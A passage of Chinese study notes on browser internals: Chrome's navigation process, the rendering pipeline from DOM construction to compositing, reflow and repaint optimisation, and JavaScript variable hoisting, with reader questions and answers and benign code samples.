200，则继续处理请求。\n6.2 200 响应处理，检查响应类型 Content-Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，不再进行后续的渲染，如果是 html 则通知浏览器进程准备渲染进程准备进行渲染。\n准备渲染进程\n7.1 浏览器进程检查当前 url 是否和之前打开的渲染进程根域名是否相同，如果相同，则复用原来的进程，如果不同，则开启新的渲染进程\n传输数据、更新状态\n8.1 渲染进程准备好后，浏览器向渲染进程发起“提交文档”的消息，渲染进程接收到消息和网络进程建立传输数据的“管道”\n8.2 渲染进程接收完数据后，向浏览器发送“确认提交”\n8.3 浏览器进程接收到确认消息后更新浏览器界面状态：安全、地址栏 url、前进后退的历史状态、更新 web 页面。\n用户输入 URL，浏览器会根据用户输入的信息判断是搜索还是网址，如果是搜索内容，就将搜索内容+默认搜索引擎合成新的 URL；如果用户输入的内容符合 URL 规则，浏览器就会根据 URL 协议，在这段内容上加上协议合成合法的 URL\n用户输入完内容，按下回车键，浏览器导航栏显示 loading 状态，但是页面还是呈现前一个页面，这是因为新页面的响应数据还没有获得\n浏览器进程浏览器构建请求行信息，会通过进程间通信（IPC）将 URL 请求发送给网络进程 GET /index.html HTTP1.1\n网络进程获取到 URL，先去本地缓存中查找是否有缓存文件，如果有，拦截请求，直接 200 返回；否则，进入网络请求过程\n网络进程请求 DNS 返回域名对应的 IP 和端口号，如果之前 DNS 数据缓存服务缓存过当前域名信息，就会直接返回缓存信息；否则，发起请求获取根据域名解析出来的 IP 和端口号，如果没有端口号，http 默认 80，https 默认 443。如果是 https 请求，还需要建立 TLS 连接。\nChrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。如果当前请求数量少于 6 个，会直接建立 TCP 连接。\nTCP 三次握手建立连接，http 请求加上 TCP 头部——包括源端口号、目的程序端口号和用于校验数据完整性的序号，向下传输\n网络层在数据包上加上 IP 头部——包括源 IP 地址和目的 IP 地址，继续向下传输到底层\n底层通过物理网络传输给目的服务器主机\n目的服务器主机网络层接收到数据包，解析出 IP 头部，识别出数据部分，将解开的数据包向上传输到传输层\n目的服务器主机传输层获取到数据包，解析出 TCP 头部，识别端口，将解开的数据包向上传输到应用层\n应用层 HTTP 解析请求头和请求体，如果需要重定向，HTTP 直接返回 HTTP 响应数据的状态 code301 或者 302，同时在请求头的 Location 字段中附上重定向地址，浏览器会根据 code 和 Location 进行重定向操作；如果不是重定向，首先服务器会根据 请求头中的 If-None-Match 的值来判断请求的资源是否被更新，如果没有更新，就返回 304 状态码，相当于告诉浏览器之前的缓存还可以使用，就不返回新数据了；否则，返回新数据，200 的状态码，并且如果想要浏览器缓存数据的话，就在相应头中加入字段： Cache-Control:Max-age=2000 响应数据又顺着应用层——传输层——网络层——网络层——传输层——应用层的顺序返回到网络进程\n数据传输完成，TCP 四次挥手断开连接。如果，浏览器或者服务器在 HTTP 头部加上如下信息，TCP 就一直保持连接。保持 TCP 连接可以省下下次需要建立连接的时间，提示资源加载速度 Connection:Keep-Alive\n网络进程将获取到的数据包进行解析，根据响应头中的 Content-type 来判断响应数据的类型，如果是字节流类型，就将该请求交给下载管理器，该导航流程结束，不再进行；如果是 text/html 类型，就通知浏览器进程获取到文档准备渲染\n浏览器进程获取到通知，根据当前页面 B 是否是从页面 A 打开的并且和页面 A 是否是同一个站点（根域名和协议一样就被认为是同一个站点），如果满足上述条件，就复用之前网页的进程，否则，新创建一个单独的渲染进程\n浏览器会发出“提交文档”的消息给渲染进程，渲染进程收到消息后，会和网络进程建立传输数据的“管道”，文档数据传输完成后，渲染进程会返回“确认提交”的消息给浏览器进程\n浏览器收到“确认提交”的消息后，会更新浏览器的页面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 web 页面，此时的 web 页面是空白页\n渲染进程对文档进行页面解析和子资源加载，HTML 通过 HTM 解析器转成 DOM Tree（二叉树类似结构的东西），CSS 按照 CSS 规则和 CSS 解释器转成 CSSOM TREE，两个 tree 结合，形成 render tree（不包含 HTML 的具体元素和元素要画的具体位置），通过 Layout 可以计算出每个元素具体的宽高颜色位置，结合起来，开始绘制，最后显示在屏幕中新页面显示出来\nhttps://linkmarket.aliyun.com内新开的页面都是新开一个渲染进程，能帮忙解释下吗？（右键在新页面打开的页面默认在新的渲染进程中渲染。）\n因为连接里面使用了 rel=\u0026ldquo;noopener noreferrer\u0026quot;这个属性。\n这个涉及到安全了，要完整解释起来就话长了，我长话短说，先看阿里这个网站的连接是下面这种形式：\n硬件商城\u0026lt;/ a\u0026gt;\n使用 noopener noreferrer 就是告诉浏览器，新打开的子窗口不需要访问父窗口的任何内容，这是为了防止一些钓鱼网站窃取父窗口的信息。\n浏览器在打开新页面时，解析到含有 noopener noreferrer 时，就知道他们不需要共享页面内容，所以这时候浏览器就会让新链接在一个新页面中打开了。\n参考 google 官方文档，貌似提交文档的原文是 commit navigation, 提交是从浏览器进程发起，至渲染进程，渲染进程确认导航，然后开始正式渲染；Now that the data and the renderer process is ready, an IPC is sent from the browser process to the renderer process to commit the navigation. It also passes on the data stream so the renderer process can keep receiving HTML data. Once the browser process hears confirmation that the commit has happened in the renderer process, the navigation is complete and the document loading phase begins.\n最后是浏览器进程通知网络进程往管道里写响应体数据，渲染进程从管道中接收到数据并解析（同时浏览器进程进行页面更新，把解析完毕的数据刷新到页面）。\n那么浏览器的 http 的 keepalive 的 connection 是什么粒度复用的呢？也是域名加协议头级别吗？\n首先 keep-alive 是为了解决连接效率不高的问题，http1.0 时代，http 请求都是短连接的形式，也即是每次请求一个资源都需要和服务器建立连接+传输数据+断开连接，通常，建立连接和断开连接的时间就有可能超过传输数据的时间了，这种短连接的效率是异常的低效。\n针对短连接低效的问题，后面就出现了长连接，也就是这里要讲的 keep-alive。\n你可以把长连接看成是一个管道，一个 http 请求结束之后，不会关闭连接，下个请求可以复用该连接，这样就省去建立连接和断开连接的时间了，但是他们请求是按照顺序，也就是符合 IP+端口规则的资源都可以复用该连接，这就回答了上面提的这个问题。\n但是，使用 keep-alive 同样存在问题，比如一个页面可能有 100 张图片素材，假设这些图片素材都保存在同一个域名下面，如果只复用一个 http 管道的话，那么传输 100 张图片的素材也是非常耗时间的，这就出现了同一时刻并发连接服务器的需求，也就是文中提到同一时刻，对同一域名下面，只能可以发起 6 个请求，这样就可以大大提升请求效率了。\n为什么是 6 个请求而不是更多了，这是为了服务器性能考虑，如果同一时刻无限制连接，那么可能会导致服务器忙不过来。\n操作系统中的任务管理器和浏览器中的任务管理器的进程数量不同，是因为有一些 chrome 进程在 chrome 自身的任务管理器中不会体现出来，比如预渲染进程。\n渲染流程（上） 前面是导航流程，提交文档后，确认提交文档前，就开始进行渲染阶段。\n了解渲染阶段相关流程能理解页面是如何工作的，可以解决一系列相关的问题，比如：\n能够理解开发者工具里面大部分项目的含义 能优化页面卡顿 使用 JavaScript 优化动画流程 通过优化样式表来防止强制同步布局等 HTML、CSS 和 JavaScript 的含义：\n每个标签都有它自己的语义，浏览器会根据标签的语义来正确展示 HTML 内容。\n由于渲染机制过于复杂，所以渲染模块在执行过程中会被划分为很多子阶段，输入的 HTML 经过这些子阶段，最后输出像素。这样的一个处理流程叫做渲染流水线。\n按照渲染的时间顺序，流水线可分为如下几个子阶段：构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。\n重点关注：\n每个子阶段都有其输入的内容；\n每个子阶段有其处理过程；\n每个子阶段会生成输出内容。\n构建 DOM 树 为什么要构建 DOM 树？这是因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树。\n从图中可以看出，构建 DOM 树的输入内容是一个 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。\n图中的 document 就是 DOM 结构，DOM 和 HTML 内容几乎是一样的，但是和 HTML 不同的是，DOM 是保存在内存中树状结构，可以通过 JavaScript 来查询或修改其内容。\n生成 DOM 树了，但是 DOM 节点的样式依然不知道，要让 DOM 节点拥有正确的样式，这就需要样式计算了。\n样式计算（Recalculate Style） 目的是为了计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成。\n把 CSS 转换为浏览器能够理解的结构 CSS 样式的来源：\n通过 link 引用的外部 CSS 文件\n\u0026lt;style\u0026gt;标记内的 CSS\n元素的 style 属性内嵌的 CSS\n浏览器无法直接理解这些纯文本的 CSS 样式，所以当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——styleSheets。\n渲染引擎会把获取到的 CSS 文本全部转换为 styleSheets 结构中的数据（那三种来源的样式都包含进去了），并且该结构同时具备了查询和修改功能，为后面的样式操作提供基础。\n转换样式表中的属性值，使其标准化 已经把现有的 CSS 文本转化为浏览器可以理解的结构了，那么接下来就要对其进行属性值的标准化操作。\n可以看到下面的 CSS 文本中有很多属性值，如 2em、blue、bold，这些类型数值不容易被渲染引擎理解，所以需要将所有值转换为渲染引擎容易理解的、标准化的计算值，这个过程就是属性值标准化。\n计算出 DOM 树中每个节点的具体样式 样式属性已被标准化，接下来就需要计算 DOM 树中每个节点的样式属性。这涉及到 CSS 的继承规则和层叠规则。\nCSS 继承就是每个 DOM 节点都包含有父节点的样式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 body { font-size: 20px; } p { color: blue; } span { display: none; } div { font-weight: bold; color: red; } div p { color: green; } 这张样式表最终应用到 DOM 节点的效果如下图所示：\n可以选择要查看的元素的样式（位于图中的区域 2 中），在图中的第 1 个区域中点击对应的元素，就可以了下面的区域查看该元素的样式了 可以从样式来源（位于图中的区域 3 中）中查看样式的具体来源信息，看看是来源于样式文件，还是来源于 UserAgent 样式表。UserAgent 样式，它是浏览器提供的一组默认样式，如果开发者不提供任何样式，默认使用的就是 UserAgent 样式 可以通过区域 2 和区域 3 来查看样式继承的具体过程 样式计算过程中的第二个规则是样式层叠。它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位。\n样式计算阶段的目的是为了计算出 DOM 节点中每个元素的具体样式，在计算过程中需要遵守 CSS 的继承和层叠两个规则。这个阶段最终输出的内容是每个 DOM 节点的样式，并被保存在 ComputedStyle 的结构内。\n**了解每个 DOM 元素最终的计算样式，**可以打开 Chrome 的“开发者工具”，选择第一个“element”标签，然后再选择“Computed”子标签，如下图所示：\n布局阶段 已经有了 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为还不知道 DOM 元素的几何位置信息。那么接下来就需要计算出 DOM 树中可见元素的几何位置，把这个计算过程叫做布局。\nChrome 在布局阶段需要完成两个任务：创建布局树和布局计算。\n创建布局树 DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 display:none 属性的元素。所以在显示之前，还要额外地构建一棵只包含可见元素布局树。\n结合下图来看看布局树的构造过程：\nDOM 树中所有不可见的节点都没有包含到布局树中。\n为了构建布局树，浏览器大体上完成了下面这些工作：\n遍历 DOM 树中的所有可见节点，并把这些节点加到布局树中； 而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 body.p.span 这个元素，因为它的属性包含 dispaly:none，所以这个元素也没有被包进布局树。 布局计算 现在有了一棵完整的布局树。那么接下来，就要计算布局树节点的坐标位置。\n在执行布局操作的时候，会把布局运算的结果重新写回布局树中，所以布局树既是输入内容也是输出内容，这是布局阶段一个不合理的地方，因为在布局阶段并没有清晰地将输入内容和输出内容区分开来。针对这个问题，Chrome 团队正在重构布局代码，下一代布局系统叫 LayoutNG，试图更清晰地分离输入和输出，从而让新设计的布局算法更加简单。\n浏览器不能直接理解 HTML 数据，所以第一步需要将其转换为浏览器能够理解的 DOM 树结构； 生成 DOM 树后，还需要根据 CSS 样式表，来计算出 DOM 树所有节点的样式； 最后计算 DOM 元素的布局信息，使其都保存在布局树中。 到这里每个节点都拥有了自己的样式和布局信息，那么后面几个阶段就要利用这些信息去展示页面。\n如果下载 CSS 文件的过程遇到阻塞，会阻塞 DOM 树的合成吗？会阻塞页面的显示吗？\n这个阻塞不会影响 DOM 的狗的构建过程，因为 dom 树的构建只依赖于 HTML，而 html 解析器在解析 HTML 时，遇到外部资源引用会有网络进程发起网络请求去加载（除了 js 脚本以外），html 解析器则继续解析 html 生成 DOM 树。\n但是会阻塞页面的显示，因为样式计算和布局树的计算都需要依赖于 css 样式规则，所以 css 文件下载阻塞了会进行等待，直到网络超时\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 当从服务器接收HTML页面的第一批数据时，HTML解析器就开始工作了，在解析过程中，如果遇到了JS脚本，如下所示： \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; 极客时间 \u0026lt;script\u0026gt; document.write(\u0026#34;--foo\u0026#34;) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 那么DOM解析器会先执行JavaScript脚本，执行完成之后，再继续往下HTML的解析。 那么第二种情况复杂点了，内联的脚本替换成js外部文件，如下所示： \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; 极客时间 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;foo.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这种情况下，当解析到JavaScript的时候，会先暂停DOM解析，并下载foo.js文件，下载完成之后执行该段JS文件，然后再继续往下解析DOM。这就是JavaScript文件为什么会阻塞DOM解析。 第三种情况，还是看下面代码： \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34; src = \u0026#34;theme.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;极客时间\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; let e = document.getElementsByTagName(\u0026#39;p\u0026#39;)[0] e.style.color = \u0026#39;blue\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 当在JavaScript中访问了某个元素的样式，那么这时候就需要等待这个样式被下载完成才能继续往下执行，所以在这种情况下，CSS也会阻塞DOM的解析。 所以JS和CSS都有可能会阻塞DOM解析 下载CSS文件阻塞了，原则上会阻塞页面的显示，但是浏览器可以有自己的容错机制，例如下载超时后，均采用user-agent stylesheet 默认样式进行渲染就可以啦，虽然丑点，但是内容在HTML都显示出来 下载 CSS 文件本身不会直接阻塞 DOM 树的构建。浏览器会并行地解析 HTML 生成 DOM 树。但是，CSS 是渲染阻塞的资源，这意味着浏览器必须等待 CSS 文件下载并解析完成后，才能开始渲染页面。这是因为 CSS 文件中的样式信息是渲染页面所必需的，而且 CSS 选择器的特性可能会影响到 DOM 树中任意元素的最终样式。 由于 CSS 对页面的显示至关重要（因为它定义了元素的样式），浏览器在下载并解析这些文件之前通常不会渲染页面内容。这意味着，尽管 DOM 树的构建可能不会被直接阻塞，页面的显示确实会被阻塞，直到相关的 CSS 被处理。这是为了防止出现样式闪烁的问题（即 FOUC，无样式内容的闪烁），这种情况下页面会先以无样式的形式渲染，然后在 CSS 加载解析之后突然变化，影响用户体验。 综上所述，虽然下载 CSS 文件不会直接阻塞 DOM 树的构建，但会阻塞页面的渲染，直到 CSS 完全被处理。为了优化加载时间和用户体验，开发者经常采取措施减少 CSS 加载时间，比如使用压缩文件、利用缓存、尽可能使用非阻塞加载技术（如异步加载或分离关键 CSS）。\n渲染流程（下） 图层树构建 有了布局树，而且每个元素的具体位置信息都计算出来了，接下来，因为页面中有很多复杂的效果，如 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了实现这些效果，渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树（LayerTree）。\n要想直观地理解什么是图层，可以打开 Chrome 的“开发者工具”，选择“Layers”标签，就可以可视化页面的分层情况，如下图所示：\n渲染引擎给页面分了很多图层，这些图层按照一定顺序叠加在一起，就形成了最终的页面，你可以参考下图：\n浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面。这些图层和布局树节点之间的关系，如文中图所示：\n通常情况下，**并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层。**如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。\n**那么需要满足什么条件，渲染引擎才会为特定的节点创建新的图层呢？**通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。\n第一点，拥有层叠上下文属性的元素会被提升为单独的一层。\n页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。\n从图中可以看出，明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性。\n层叠上下文\n第二点，需要剪裁（clip）的地方也会被创建为图层。\n什么是剪裁？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;style\u0026gt; div { width: 200; height: 200; overflow:auto; background: gray; } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div \u0026gt; \u0026lt;p\u0026gt;所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;从上图我们可以看到，document层上有A和B层，而B层之上又有两个图层。这些图层组织在一起也是一颗树状结构。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; 在这里把 div 的大小限定为 200 _ 200 像素，而 div 里面的文字内容比较多，文字所显示的区域肯定会超出 200 *200 的面积，这时候就产生了剪裁，渲染引擎会把裁剪文字内容的一部分用于显示在 div 区域，下图是运行时的执行结果：\n出现这种裁剪情况的时候，如果出现滚动条，滚动条也会被提升为单独的层。可以参考下图：\n所以说，元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。\n图层绘制 在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制，渲染引擎是怎么实现图层绘制的？\n渲染引擎实现图层的绘制，会把一个图层的绘制拆分成很多小的绘制指令，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：\n从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，输出的内容就是这些待绘制列表。\n可以打开“开发者工具”的“Layers”标签，选择“document”层，来实际体验下绘制列表，如下图所示：\n在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。\n栅格化（raster）操作 绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染进程中的合成线程来完成的。可以结合下图来看下渲染主线程和合成线程之间的关系：\n如上图所示，当图层的绘制列表准备好之后，主线程会把该绘制列表提交（commit）给合成线程，那么接下来合成线程是怎么工作的呢？\n先来看看什么是视口，可以参看下图：\n通常一个页面可能很大，但是用户只能看到其中的一部分，把用户可以看到的这个部分叫做视口（viewport）。在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。\n基于这个原因，合成线程会将图层划分为图块（tile），这些图块的大小通常是 256x256 或者 512x512，如下图所示：\n然后合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图。而图块是栅格化执行的最小单位。渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：\n通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。\nGPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：\n从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。\n合成和显示 一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，获取 GPU 进程内存中的位图，并将其页面内容绘制到内存中，最后再将内存显示在屏幕上。到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出页面了。\n渲染流水线总结 从 HTML 到 DOM、样式计算、布局、图层、绘制列表、光栅化、合成和显示。下面用一张图来总结下这整个渲染流程：\n结合上图，一个完整的渲染流程大致可总结为如下：\n渲染进程中的 HTML 解析器将 HTML 内容转换为能够读懂的 DOM 树结构。 渲染引擎将 CSS 样式表转化为浏览器可以理解的 styleSheets，计算出 DOM 节点的样式。 创建布局树，并计算元素的布局信息。 对布局树进行分层，并生成分层树。 为每个图层生成绘制列表，并将其提交到合成线程。 合成线程将图层分成图块，并在光栅化线程池中将图块转换成位图。 合成线程发送绘制图块命令 DrawQuad 给浏览器进程。 浏览器进程根据 DrawQuad 消息生成页面，并显示到显示器上。 相关概念 三个和渲染流水线相关的概念——“重排”“重绘”和“合成”。理解了这三个概念对 Web 的性能优化会有很大帮助。\n更新了元素的几何属性（重排） 从上图可以看出，如果你通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫重排。无疑，重排需要更新完整的渲染流水线，所以开销也是最大的。\n更新元素的绘制属性（重绘） 比如通过 JavaScript 更改某些元素的背景颜色，渲染流水线会怎样调整呢？你可以参考下图：\n从图中可以看出，如果修改了元素的背景颜色，那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫重绘。相较于重排操作，重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些。\n直接合成阶段 那如果更改一个既不要布局也不要绘制的属性，会发生什么变化？渲染引擎将跳过布局和绘制，只执行后续的合成操作，把这个过程叫做合成。具体流程参考下图：\n在上图中，使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以相对于重绘和重排，合成能大大提升绘制效率。\n总结 Chrome 的渲染流水线还是相当复杂，不过 Chrome 团队在不断添加新功能的同时，也在不断地重构一些子阶段，目的就是让整体渲染架构变得更加简单和高效。\n在优化 Web 性能的方法中，减少重绘、重排是一种很好的优化方式，那么结合文中的分析，能总结出来为什么减少重绘、重排能优化 Web 性能吗？那又有那些具体的实践方法能减少重绘、重排呢？\n减少重排重绘, 方法很多：\n使用 class 操作样式，而不是频繁操作 style 避免使用 table 布局 批量 dom 操作，例如 createDocumentFragment，或者使用框架，例如 React Debounce window resize 事件 对 dom 属性的读写要分离 will-change: transform 做优化 减少重排重绘，相当于少了渲染进程的主线程和非主线程的很多计算和操作，能够加快 web 的展示。\n触发 repaint reflow 的操作尽量放在一起，比如改变 dom 高度和设置 margin 分开写，可能会出发两次重排 通过虚拟 dom 层计算出操作总得差异，一起提交给浏览器。之前还用过 createdocumentfragment 来汇总 append 的 dom,来减少触发重排重绘次数。 关于浏览器的渲染细节的知识老师是从哪里学到的？，是通过研究源码学习的吗？有没有一些好的学习资料或者学习方法推荐？\n1 2 3 4 5 6 7 8 9 10 11 12 主要几个途径： 1:chromium源码 2:chromium源码里面的一些注释和文档 3:还有油管上blinkon上有一些深入讲解内核的视频 目前基本没有系统介绍浏览器知识的文档，而且网上很多文档还是比较早期的，很多内容都不太适合新版的浏览器了。 这里将浏览器知识和前端系统下结合起来是一件工作量非常大的事。 如果想要保证画面的流畅，就需要尽量降低每帧的渲染时间，所以局部更新流水线显得非常重要了，能大大减少处理每帧所消耗的时间。 渲染流程的最后，应该是浏览器进程将 Compositor Frame 发送到 GPU, GPU 进行显示吧？\n作者回复: 因为结构比较复杂，chromium 团队还在重构大的架构，既然问到了，就简要介绍下：\n首先渲染进程里执行图层合成(Layer Compositor)，也就是生成图层的操作，具体地讲，渲染进程的合成线程接收到图层的绘制消息时，会通过光栅化线程池将其提交给 GPU 进程，在 GPU 进程中执行光栅化操作，执行完成，再将结果返回给渲染进程的合成线程，执行合成图层操作！ 合成的图层会被提交给浏览器进程，浏览器进程里会执行显示合成(Display Compositor)，也就是将所有的图层合成为可以显示的页面图片。 最终显示器显示的就是浏览器进程中合成的页面图片 变量提升 JavaScript 的执行分为两个阶段：\n编译阶段 执行阶段 执行上下文 理解了 JavaScrip 的执行上下文，才能更好的比如变量提升、作用域和闭包等。\n1 2 3 4 5 6 showName(); console.log(myname); var myname = \u0026#34;极客时间\u0026#34;; function showName() { console.log(\u0026#34;函数showName被执行\u0026#34;); } 函数或者变量可以在定义之前使用。\n1 2 3 4 5 showName(); console.log(myname); function showName() { console.log(\u0026#34;函数showName被执行\u0026#34;); } 结论:\n在执行过程中，若使用了未声明的变量，那么 JavaScript 执行会报错。 在一个变量定义之前使用它，不会出错，但是该变量的值会为 undefined，而不是定义时的值。 在一个函数定义之前使用它，不会出错，且函数能正确执行。 变量提升（Hoisting） 变量的「创建」「初始化」「赋值」三种区别\n在块作用域内，let 声明的变量被提升，但变量只是创建被提升，初始化并没有被提升，在初始化之前使用变量，就会形成一个暂时性死区。\n【拓展】\nvar 的创建和初始化被提升，赋值不会被提升。\nlet 的创建被提升，初始化和赋值不会被提升。\nfunction 的创建、初始化和赋值均会被提升。\n变量的声明和赋值\n1 2 3 4 var myname = \u0026#34;极客时间\u0026#34;; var myname = undefined; //声明部分 的 创建被提升 同时 初始化被提升且值为undefined myname = \u0026#34;极客时间\u0026#34;; //赋值部分 函数的声明和赋值\n1 2 3 4 5 6 7 function foo() { console.log(\u0026#34;foo\u0026#34;); } var bar = function () { console.log(\u0026#34;bar\u0026#34;); }; 所谓的变量提升，是指在 JavaScript 代码执行过程中，JavaScript 引擎把变量的声明部分和函数的声明部分提升到代码开头的“行为”。变量被提升后，会给变量设置默认值，这个默认值就是 undefined。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /* * 变量提升部分 */ // 把变量 myname提升到开头， // 同时给myname赋值为undefined var myname = undefined; // 把函数showName提升到开头 function showName() { console.log(\u0026#34;showName被调用\u0026#34;); } /* * 可执行代码部分 */ showName(); console.log(myname); // 去掉var声明部分，保留赋值语句 myname = \u0026#34;极客时间\u0026#34;; 第一处是把声明的部分都提升到了代码开头，如变量 myname 和函数 showName，并给变量设置默认值 undefined； 第二处是移除原本声明的变量和函数，如 var myname = \u0026lsquo;极客时间\u0026rsquo;的语句，移除了 var 声明，整个移除 showName 的函数声明。 从概念的字面意义上来看，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，正如所模拟的那样。但这并不准确。实际上变量和函数声明在代码里的位置是不会改变的，而且是在编译阶段被 JavaScript 引擎放入内存中。\n**一段 JavaScript 代码在执行之前需要被 JavaScript 引擎编译，编译完成之后，才会进入执行阶段。**大致流程你可以参考下图：\n编译阶段 第一部分：变量提升部分的代码。\n1 2 3 4 var myname = undefined; function showName() { console.log(\u0026#34;函数showName被执行\u0026#34;); } 第二部分：执行部分的代码。\n1 2 3 showName(); console.log(myname); myname = \u0026#34;极客时间\u0026#34;; 执行流程如下图所示：\n输入一段代码，经过编译后，会生成两部分内容：执行上下文（Execution context）和可执行代码。\n执行上下文是 JavaScript 执行一段代码时的运行环境，比如调用一个函数，就会编译进入栈这个函数的执行上下文，确定该函数在执行期间用到的诸如 this、变量、对象以及函数等。\n在执行上下文中存在一个变量环境的对象（Viriable Environment），该对象中保存了变量提升的内容，比如上面代码中的变量 myname 和函数 showName，都保存在该对象中。\n可以简单地把变量环境对象看成是如下结构：\n1 2 3 VariableEnvironment: myname -\u0026gt; undefined, showName -\u0026gt;function : {console.log(myname) 接下来，再结合下面这段代码来分析下是如何生成变量环境对象的。\n1 2 3 4 5 6 showName(); console.log(myname); var myname = \u0026#34;极客时间\u0026#34;; function showName() { console.log(\u0026#34;函数showName被执行\u0026#34;); } 第 1 行和第 2 行，由于不是声明操作，所以 JavaScript 引擎不会做任何处理； 第 3 行，由于这行是经过 var 声明的，因此 JavaScript 引擎将在环境对象中创建一个名为 myname 的属性，并使用 undefined 对其初始化； 第 4 行，JavaScript 引擎发现了一个通过 function 定义的函数，所以它将函数定义存储到堆 (HEAP）中，并在环境对象中创建一个 showName 的属性，然后将该属性值指向堆中函数的位置。 这样就生成了变量环境对象。接下来 JavaScript 引擎会把声明以外的代码编译为字节码。\n1 2 3 showName() console.log(myname) myname = \u0026#39;极客时间\u0026#39; 执行阶段 JavaScript 引擎开始执行“可执行代码”，按照顺序一行一行地执行。\n当执行到 showName 函数时，JavaScript 引擎便开始在变量环境对象中查找该函数，由于变量环境对象中存在该函数的引用，所以 JavaScript 引擎便开始执行该函数，并输出“函数 showName 被执行”结果。\n接下来打印“myname”信息，JavaScript 引擎继续在变量环境对象中查找该变量，由于变量环境存在 myname 变量，并且其值为 undefined，所以这时候就输出 undefined。\n接下来执行第 3 行，把“极客时间”赋给 myname 变量，赋值后变量环境中的 myname 属性值改变为“极客时间”，变量环境如下所示：\n1 2 3 VariableEnvironment: myname -\u0026gt; 